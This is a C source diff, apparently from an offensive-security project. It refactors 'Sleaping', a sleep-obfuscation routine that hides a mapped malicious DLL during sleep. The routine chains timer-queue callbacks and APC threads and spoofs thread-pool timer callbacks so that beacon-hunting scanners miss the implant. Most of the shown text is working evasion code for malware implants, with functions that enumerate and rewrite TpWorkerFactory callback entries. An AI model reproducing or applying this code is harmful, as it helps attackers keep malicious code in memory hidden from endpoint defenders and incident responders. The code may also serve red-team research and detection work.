@@ -8,7 +8,7 @@
 /*------------------------------------------------------------*/
 
 //size of CtxHide and CtxFix is 6, in total 12 threads are created for implmenting the timer callback spoofing tehcnique
-int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE DummyEvent, PHANDLE apcThreads, PCONTEXT CtxHide, PCONTEXT CtxFix, PDWORD64 ResumeThreadValue, PDWORD64 SafeCallback, PNT_FUNCTIONS ntFunctions, PVOID NtWaitForSingleObjectAddress, PVOID NtTestAlertAddress) {
+int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHANDLE DummyEvent, PHANDLE apcThreads, PCONTEXT CtxHide, PCONTEXT CtxFix, PDWORD64 ResumeThreadValue, PDWORD64 SafeCallback, PNT_FUNCTIONS ntFunctions, PVOID NtTestAlertAddress) {
 
 
     /* --------- HIDING --------- */
@@ -215,7 +215,7 @@ int SleapingAPCNG(PTPP_CLEANUP_GROUP_MEMBER* callbackinfo, PHANDLE EvntHide, PHA
 
 //original unmodified version can be found here
 //https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
-int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, int* arraySize, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {
+int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, int* arraySize, PTPP_CLEANUP_GROUP_MEMBER* callbackArray, PNT_FUNCTIONS ntFunctions) {
 
     //objects for the worker factory
     WORKER_FACTORY_BASIC_INFORMATION wfbi = { 0 };
@@ -228,16 +228,8 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
     INT64 highest = 0;
     INT64 second_highest = 0;
 
-    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
-        return -1;
-    }
-    //retrieve NT functions
-    NtQueryInformationWorkerFactoryFunc NtQueryInformationWorkerFactory = (NtQueryInformationWorkerFactoryFunc)GetProcAddress(hNtdll, "NtQueryInformationWorkerFactory");
-    if (NtQueryInformationWorkerFactory == NULL) {
-        return -1;
-    }
 
-    if (NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL) == STATUS_SUCCESS) {
+    if (ntFunctions->NtQueryInformationWorkerFactory(hWorkerFactory, WorkerFactoryBasicInformation, &wfbi, sizeof(WORKER_FACTORY_BASIC_INFORMATION), NULL) == STATUS_SUCCESS) {
 
         if (ReadProcessMemory(GetCurrentProcess(), wfbi.StartParameter, &full_tp_pool, sizeof(FULL_TP_POOL), &len) == FALSE) {
             return -1;
@@ -305,27 +297,12 @@ int GetInfoFromWorkerFactory(HANDLE hWorkerFactory, PVOID ResumeThreadAddress, i
 
 //original unmodified version can be found here
 //https://github.com/thefLink/Hunt-Sleeping-Beacons/blob/main/src/EnumerateSuspiciousTimers.cpp
-int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMBER* callbackArray) {
+int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMBER* callbackArray, PNT_FUNCTIONS ntFunctions) {
 
 
     HMODULE hNtdll = { 0 };
     int arraySize = 0;
-
-
-    if (!(hNtdll = GetModuleHandleA("ntdll"))) {
-        return -1;
-    }
-
-    //retrieve syscalls address 
-    NtQuerySystemInformationFunc NtQuerySystemInformation = (NtQuerySystemInformationFunc)GetProcAddress(hNtdll, "NtQuerySystemInformation");
-    if (NtQuerySystemInformation == NULL) {
-
-        return -1;
-    }
-    NtQueryObjectFunc NtQueryObject = (NtQueryObjectFunc)GetProcAddress(hNtdll, "NtQueryObject");
-    if (NtQuerySystemInformation == NULL) {
-        return -1;
-    }
+	
 
     // Call NtQuerySystemInformation to get the handles information
     ULONG bufferSize = 0x1000;
@@ -336,7 +313,7 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
         return -1;
     }
 
-    while ((status = NtQuerySystemInformation(
+    while ((status = ntFunctions->NtQuerySystemInformation(
         SystemHandleInformation,
         buffer,
         bufferSize,
@@ -365,7 +342,7 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
         if (handle.ProcessId == GetProcessId(GetCurrentProcess())) {
 
 
-            if (NtQueryObject((void*)handle.Handle, ObjectTypeInformation, objectTypeInfo, sizeof(OBJECT_TYPE_INFORMATION) * 2, NULL) < 0) {
+            if (ntFunctions->NtQueryObject((void*)handle.Handle, ObjectTypeInformation, objectTypeInfo, sizeof(OBJECT_TYPE_INFORMATION) * 2, NULL) < 0) {
 
                 continue;
             }
@@ -373,7 +350,7 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
             if (!lstrcmpW(objectTypeInfo->Name.Buffer, L"TpWorkerFactory")) {
 
 
-                if (GetInfoFromWorkerFactory((HANDLE)handle.Handle, ResumeThreadAddress, &arraySize, callbackArray) == -1) {
+                if (GetInfoFromWorkerFactory((HANDLE)handle.Handle, ResumeThreadAddress, &arraySize, callbackArray, ntFunctions) == -1) {
 
                     arraySize = 0;
                     continue;
@@ -401,10 +378,10 @@ int EnumResumeThreadCallbacks(PVOID ResumeThreadAddress, PTPP_CLEANUP_GROUP_MEMB
 
 /*-----------------------------------------------------------*/
 
-int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID ResumeThreadAddress, PVOID NtTestAlertAddress,PVOID MessageBoxAddress, PVOID NtWaitForSingleObjectAddress) {
+int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_T viewSize, PNT_FUNCTIONS ntFunctions, PVOID ResumeThreadAddress, PVOID NtTestAlertAddress,PVOID MessageBoxAddress) {
 
     //APC Threads
-    PHANDLE ApcThreads = (PHANDLE)(VirtualAlloc(NULL, 6 * sizeof(HANDLE), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
+    HANDLE ApcThreads[6] = { 0 };
 
     //Context APC threads
     CONTEXT* CtxHide = (CONTEXT*)(VirtualAlloc(NULL, 3 * sizeof(CONTEXT), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
@@ -416,17 +393,13 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     HANDLE   EvntHide = { 0 };
     HANDLE DummyEvent = { 0 };
 
-    //support NT functions 
-    HMODULE hNtdll = { 0 };
-
+   
+    
     //callbackArray for APC to spoof
-    PTPP_CLEANUP_GROUP_MEMBER* callbackArray = (PTPP_CLEANUP_GROUP_MEMBER*)VirtualAlloc(NULL, 2 * sizeof(PTPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	PTPP_CLEANUP_GROUP_MEMBER callbackArray[2] = { 0 };
     DWORD64 ResumeThreadValue = (DWORD64) ResumeThreadAddress;
     DWORD64 SafeCallback = (DWORD64) MessageBoxAddress;
-    //initializing callback array structs
-    for (int i = 0; i < 2; i++) {
-        callbackArray[i] = (PTPP_CLEANUP_GROUP_MEMBER)VirtualAlloc(NULL, sizeof(TPP_CLEANUP_GROUP_MEMBER), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-    }
+    
 
     //sleaping threads = 5 Timers + 6 APC threads
     HANDLE ThreadArray[11] = { NULL };
@@ -552,10 +525,10 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
         CreateTimerQueueTimer(&hNewTimer, hTimerQueue, (WAITORTIMERCALLBACK)ResumeThread, ThreadArray[3], 20200, 0, WT_EXECUTEINTIMERTHREAD);//mapmal
 		
         //TpWorkerFactory objects enumerated successfully so callbackArray now contains the addresses to fix
-        if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray) == 0) {
+        if (EnumResumeThreadCallbacks(ResumeThreadAddress, callbackArray, ntFunctions) == 0) {
             
             //i should run SleapingAPC here so that all those contexts are available
-            if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, &ResumeThreadValue, &SafeCallback, ntFunctions, NtWaitForSingleObjectAddress, NtTestAlertAddress) == 0) {
+            if (SleapingAPCNG(callbackArray, &EvntHide, &DummyEvent, ApcThreads, CtxHide, CtxFix, &ResumeThreadValue, &SafeCallback, ntFunctions, NtTestAlertAddress) == 0) {
                 
                 int counter = 5;
                 for (int i = 0; i < 6; i++) {
@@ -583,27 +556,35 @@ int Sleaping(PVOID ImageBaseDLL, HANDLE sacDllHandle, HANDLE malDllHandle, SIZE_
     }
 
     //good morning
+	if (hNewTimer != NULL) {
+		if (DeleteTimerQueueTimer(hTimerQueue, hNewTimer, NULL) == 0) {
+			return -1;
+		}
+	}
+
     if (DeleteTimerQueue(hTimerQueue) == 0) {
 
         return -1;
     }
+
+	//print all the addresses before freeing the memory
+    CHAR buffer[20] = { 0 };
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    DWORD charsWritten;
+    
+
+    
+    
+
+
     //clean up totale
     if (context) VirtualFree(context, 0, MEM_RELEASE);
     if (contextB) VirtualFree(contextB, 0, MEM_RELEASE);
     if (contextC) VirtualFree(contextC, 0, MEM_RELEASE);
     if (contextD) VirtualFree(contextD, 0, MEM_RELEASE);
     if (contextE) VirtualFree(contextE, 0, MEM_RELEASE);
-    for (int i = 0; i < 2; i++) {
-        if (callbackArray[i] != NULL) {
-            VirtualFree(callbackArray[i], 0, MEM_RELEASE);
-        }
-    }
-    if (callbackArray) VirtualFree(callbackArray, 0, MEM_RELEASE);
-    if (ApcThreads) VirtualFree(ApcThreads, 0, MEM_RELEASE);
     if (CtxFix) VirtualFree(CtxFix, 0, MEM_RELEASE);
     if (CtxHide) VirtualFree(CtxHide, 0, MEM_RELEASE);
-   // if (ResumeThreadValue) VirtualFree(ResumeThreadValue, 0, MEM_RELEASE);
-	//if (SafeCallback) VirtualFree(SafeCallback, 0, MEM_RELEASE);
     if (EvntHide) CloseHandle(EvntHide);
     if (DummyEvent) CloseHandle(DummyEvent);
 
